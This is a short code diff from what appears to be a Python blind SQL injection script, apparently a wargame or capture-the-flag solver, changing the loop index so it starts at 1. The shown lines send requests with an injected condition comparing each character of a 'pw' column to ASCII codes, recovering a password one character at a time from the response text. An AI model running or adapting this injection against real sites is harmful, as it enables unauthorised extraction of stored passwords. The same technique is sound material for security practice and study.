@@ -16,7 +16,7 @@ for i in range(40):
 
 # pw string
 ans = ""
-for i in range(pw_length):
+for i in range(1, pw_length + 1):
 	for j in range(65, 127):
 		res = requests.get(url + id + ' and ascii(substr(pw, {}, 1))={} -- '.format(i, j) + pw)
 		if ("wrong password" in res.text):
